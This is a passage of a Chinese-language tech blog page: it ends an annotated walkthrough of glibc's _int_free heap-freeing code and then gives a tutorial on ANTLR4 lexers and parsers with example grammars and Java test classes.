<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p))<span class="comment">//p不能是mmap映射的</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">    &#123;</span><br><span class="line">      (<span class="type">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">      locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);<span class="comment">//取物理上下一个相邻的堆块基地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(p == av-&gt;top))<span class="comment">//p不能是topchunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(contiguous(av) &amp;&amp; (<span class="type">char</span> *)nextchunk &gt;= ((<span class="type">char</span> *)av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">    &#123;<span class="comment">//如果下一个堆块溢出到topchunk内部了</span></span><br><span class="line">      errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(!prev_inuse(nextchunk)))</span><br><span class="line">    &#123;<span class="comment">//如果物理上的后块没有记录本块的释放状态</span></span><br><span class="line">      errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);<span class="comment">//下一个堆块的大小</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect(nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    &#123;<span class="comment">//下一堆块的大小必须在合法范围(2*SIZE_SZ,av-&gt;system_mem)之内</span></span><br><span class="line">      errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb(chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);<span class="comment">//p数据区清零</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p))<span class="comment">//向前合并</span></span><br><span class="line">    &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top)<span class="comment">//如果后块时topchunk则合并到topchunk,否则尝试向后合并</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse)<span class="comment">//如果后一堆块空闲则向后合并</span></span><br><span class="line">      &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">  Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">  not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">  been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">      bck = unsorted_chunks(av);<span class="comment">//释放的堆块放到unsortedbin中,下一次malloc才可能重新安排新去处</span></span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">      p-&gt;fd = fwd;</span><br><span class="line">      p-&gt;bk = bck;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(size))<span class="comment">//如果是largebin的堆块则现在就把fd_nextsize和bk_nextsize清零</span></span><br><span class="line">      &#123;</span><br><span class="line">        p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      bck-&gt;fd = p;</span><br><span class="line">      fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      set_foot(p, size);</span><br><span class="line"></span><br><span class="line">      check_free_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span><span class="comment">//此else意味着向后与topchunk相邻,则合并到topchunk</span></span><br><span class="line">    &#123;</span><br><span class="line">      size += nextsize;</span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD)</span><br><span class="line">    &#123;<span class="comment">//如果size大于fastbin合并阈值65536</span></span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">        malloc_consolidate(av);<span class="comment">//清空fastbin,该合并合并,放到unsortedbin或者topchunk</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena)<span class="comment">//如果是主分配区</span></span><br><span class="line">      &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.trim_threshold))<span class="comment">//如果topchunk太大了就得修剪一下</span></span><br><span class="line">          systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span><span class="comment">//否则就是非主分配区的辅助堆</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">           large, because the corresponding heap might go away.  */</span></span><br><span class="line">        heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">        assert(heap-&gt;ar_ptr == av);</span><br><span class="line">        heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">    &#123;</span><br><span class="line">      assert(locked);<span class="comment">//保证事务完整性</span></span><br><span class="line">      (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h4 id="mmap映射区释放">mmap映射区释放</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  munmap_chunk(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2023/05/31/Antlr/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/05/31/Antlr/" class="post-title-link" itemprop="url">Antlr4</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-05-31 22:31:00" itemprop="dateCreated datePublished" datetime="2023-05-31T22:31:00+08:00">2023-05-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-04-24 22:10:17" itemprop="dateModified" datetime="2024-04-24T22:10:17+08:00">2024-04-24</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="antlr4">Antlr4</h1>
<p>项目地址<a
target="_blank" rel="noopener" href="https://github.com/DeutschBall/Interpreter-Antlr">DeutschBall/Interpreter-Antlr:
Antlr实现的函数绘图语言解释器 (github.com)</a></p>
<h2 id="环境配置">环境配置</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">antlr Hello.g4</span><br></pre></td></tr></table></figure>
<p>这种生成命令,实际上这里的antlr执行的命令是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java org.antlr.v4.Tool ./Hello.g4</span><br></pre></td></tr></table></figure>
<p>也就是说,org.antlr.v4.Tool应该是在CLASSPATH中的</p>
<p>在windows中需要在变量CLASSPATH中加上jar包的地址</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230524151158485.png"
alt="image-20230524151158485" />
<figcaption aria-hidden="true">image-20230524151158485</figcaption>
</figure>
<p>任何一个Antlr源文件,比如Hello.g4,如果语法没有错误,执行antlr4
Hello.g4之后,都会生成六个文件</p>
<table>
<thead>
<tr>
<th>文件</th>
<th>作用</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>HelloParser.java</td>
<td>不想写</td>
<td></td>
</tr>
<tr>
<td>HelloLexer.java</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Hello.tokens</td>
<td></td>
<td></td>
</tr>
<tr>
<td>HelloLexer.tokens</td>
<td></td>
<td></td>
</tr>
<tr>
<td>HelloListener.java</td>
<td></td>
<td></td>
</tr>
<tr>
<td>HelloBaseListener.java</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="词法分析器">词法分析器</h2>
<p>词法分析器实现,继承自org.antlr.v4.runtime.Lexer</p>
<p>这个类干了啥呢?</p>
<p>首先,<code>*Lexer.java</code>文件中是没有main函数的,这就意味着,这个类只能作为其他类的组成,或者被其他函数调用</p>
<p>从名字上看,这个类应该得有一个DFA,不管是表驱动的还是有向图驱动的还是硬编码的,得有一个输入,然后从输入中获取符号流,然后在DFA上进行状态转移,每次调用它,都应返回一个识别出的记号token</p>
<p>举个例子,统计单词数量</p>
<p>antlr语法规则文件这样写:</p>
<p><code>Counter.g4</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lexer grammar Counter;</span><br><span class="line"></span><br><span class="line">WORD: [a-zA-Z0-9]+;</span><br><span class="line">SPACE: [ \t\n\r]-&gt;skip;</span><br></pre></td></tr></table></figure>
<p>然后执行命令<code>antlr4 ./Counter.g4</code></p>
<p>由于g4文件中只定义了词法规则 lexer
grammer,因此只会生成词法分析器相关的文件</p>
<table>
<thead>
<tr>
<th>文件</th>
<th>作用</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>Counter.interp</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Counter.java</td>
<td>词法分析器类</td>
<td></td>
</tr>
<tr>
<td>Counter.tokens</td>
<td>定义符号与到整数的映射</td>
<td></td>
</tr>
</tbody>
</table>
<p>生成一堆文件,其中就包括Counter.java,也就是词法分析器文件</p>
<p>这里面就一个Counter类,它干了啥呢?</p>
<p>最主要的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">_serializedATN</span> <span class="operator">=</span></span><br><span class="line">	<span class="string">&quot;\3\u608b\ua72a\u8133\ub9ed\u417c\u3be7\u7786\u5964\2\4\20\b\1\4\2\t\2&quot;</span>+</span><br><span class="line">	<span class="string">&quot;\4\3\t\3\3\2\6\2\t\n\2\r\2\16\2\n\3\3\3\3\3\3\3\3\2\2\4\3\3\5\4\3\2\4&quot;</span>+</span><br><span class="line">	<span class="string">&quot;\5\2\62;C\\c|\5\2\13\f\17\17\&quot;\&quot;\2\20\2\3\3\2\2\2\2\5\3\2\2\2\3\b\3\2&quot;</span>+</span><br><span class="line">	<span class="string">&quot;\2\2\5\f\3\2\2\2\7\t\t\2\2\2\b\7\3\2\2\2\t\n\3\2\2\2\n\b\3\2\2\2\n\13&quot;</span>+</span><br><span class="line">	<span class="string">&quot;\3\2\2\2\13\4\3\2\2\2\f\r\t\3\2\2\r\16\3\2\2\2\16\17\b\3\2\2\17\6\3\2&quot;</span>+</span><br><span class="line">	<span class="string">&quot;\2\2\4\2\n\3\b\2\2&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ATN</span> <span class="variable">_ATN</span> <span class="operator">=</span></span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">ATNDeserializer</span>().deserialize(_serializedATN.toCharArray());</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">	_decisionToDFA = <span class="keyword">new</span> <span class="title class_">DFA</span>[_ATN.getNumberOfDecisions()];</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; _ATN.getNumberOfDecisions(); i++) &#123;</span><br><span class="line">		_decisionToDFA[i] = <span class="keyword">new</span> <span class="title class_">DFA</span>(_ATN.getDecisionState(i), i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中有一个硬编码的static字符串,其中存放了序列化的ATN,ATN是啥?状态转移网络</p>
<p>这里_ATN这个static成员在本类的加载时,就会反序列化_serializedATN,建立ATN网络,</p>
<p>然后static静态代码块中,以ATN网络为基础建立了DFA</p>
<p>至于这个序列化ATN字符串什么含义,我不想研究,相当于硬编码的DFA</p>
<p>本类中害保存了符号名称,比如WORD,SPACE</p>
<p>本类从org.antlr.v4.runtime.Lexer基类中继承了nextToken等函数,nextToken函数每次被调用会识别一个符号</p>
<p>如何使用该类呢?</p>
<p>可以写一个测试类TestLexer.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.antlr.v4.runtime.*;</span><br><span class="line"><span class="keyword">import</span> org.antlr.v4.runtime.CharStreams;</span><br><span class="line"><span class="keyword">import</span> org.antlr.v4.runtime.Token;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestLexer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> cnt_words=<span class="number">0</span>;</span><br><span class="line">        <span class="type">CharStream</span> <span class="variable">input</span> <span class="operator">=</span> CharStreams.fromString(<span class="string">&quot;public static void main&quot;</span>);</span><br><span class="line">        Counter lexer=<span class="keyword">new</span> <span class="title class_">Counter</span>(input);</span><br><span class="line">        Token token;</span><br><span class="line">        <span class="keyword">while</span>((token=lexer.nextToken()).getType()!=Token.EOF)&#123;</span><br><span class="line">            String tokenName=Counter.VOCABULARY.getSymbolicName(token.getType());</span><br><span class="line">            String tokenText=token.getText();</span><br><span class="line">            System.out.printf(<span class="string">&quot;%s: %s%n&quot;</span>,tokenName,tokenText);</span><br><span class="line">            <span class="keyword">if</span>(tokenName==<span class="string">&quot;WORD&quot;</span>)&#123;</span><br><span class="line">                ++cnt_words;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;total words=&quot;</span>+cnt_words);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>从字符串"public static void
main"创建一个字符输入流,然后将这个流作为Counter lexer的输入</p>
<p>此后每次调用lexer.nextToken(),lexer都会尝试从该字符输入流中获取一个符号,符号的类型是org.antlr.v4.runtime.Token</p>
<h2 id="语法分析器">语法分析器</h2>
<p>以计算器为例</p>
<p>Calculator.g4</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">grammar Calculator;</span><br><span class="line"><span class="comment">// import LexerRule;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 语法定义</span></span><br><span class="line">prog: stat+;</span><br><span class="line"></span><br><span class="line">stat: expr NEWLINE      </span><br><span class="line">|ID <span class="string">&#x27;=&#x27;</span> expr NEWLINE    </span><br><span class="line">|NEWLINE                </span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">expr: expr (<span class="string">&#x27;*&#x27;</span>|<span class="string">&#x27;/&#x27;</span>) expr   </span><br><span class="line">|expr (<span class="string">&#x27;+&#x27;</span>|<span class="string">&#x27;-&#x27;</span>) expr        </span><br><span class="line">|INT                        </span><br><span class="line">|ID                         </span><br><span class="line">|<span class="string">&#x27;(&#x27;</span> expr <span class="string">&#x27;)&#x27;</span>               </span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ID: [a-zA-Z]+;</span><br><span class="line">INT:[<span class="number">0</span>-<span class="number">9</span>]+;</span><br><span class="line">WS:[ \t\n]+ -&gt;skip;<span class="comment">//多余的空格回车忽略</span></span><br><span class="line">NEWLINE: <span class="string">&#x27;\r&#x27;</span>? <span class="string">&#x27;\n&#x27;</span>;<span class="comment">//\r\n是win上的换行符,\r是linux上的换行</span></span><br></pre></td></tr></table></figure>
<p>执行命令<code>antlr4 ./Calculator.g4</code>之后,会在本目录下生成</p>
<table>
<thead>
<tr>
<th>文件</th>
<th>作用</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>CalculatorLexer.java</td>
<td>词法分析器类</td>
<td></td>
</tr>
<tr>
<td>CalculatorParser.java</td>
<td>语法分析器类</td>
<td></td>
</tr>
<tr>
<td>CalculatorListener.java</td>
<td>监听器接口</td>
<td></td>
</tr>
<tr>
<td>Calculator.BaseListener.java</td>
<td>监听器基类</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>...</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>写一个测试类Test,测试语法分析器的作用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.antlr.runtime.ANTLRInputStream;</span><br><span class="line"><span class="keyword">import</span> org.antlr.v4.runtime.*;</span><br><span class="line"><span class="keyword">import</span> org.antlr.v4.runtime.CharStreams;</span><br><span class="line"><span class="keyword">import</span> org.antlr.v4.runtime.Token;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> org.antlr.v4.runtime.tree.*;</span><br><span class="line"><span class="keyword">import</span> org.antlr.v4.tool.ANTLRToolListener;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String inputFile=<span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(args.length&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            inputFile=args[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        CharStream input=<span class="literal">null</span>;</span><br><span class="line">        InputStream is=System.in;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(inputFile!=<span class="literal">null</span>)&#123;</span><br><span class="line">                is=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(inputFile);</span><br><span class="line">            &#125;</span><br><span class="line">            input=CharStreams.fromStream(is);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ANTLRInputStream input=new ANTLRInputStream(is);</span></span><br><span class="line">        CalculatorLexer lexer=<span class="keyword">new</span> <span class="title class_">CalculatorLexer</span>(input);</span><br><span class="line">        CommonTokenStream tokens=<span class="keyword">new</span> <span class="title class_">CommonTokenStream</span>(lexer);</span><br><span class="line">        CalculatorParser parser=<span class="keyword">new</span> <span class="title class_">CalculatorParser</span>(tokens);</span><br><span class="line">        ParseTree tree=parser.prog();</span><br><span class="line">        </span><br><span class="line">        System.out.println(tree.toStringTree(parser));</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
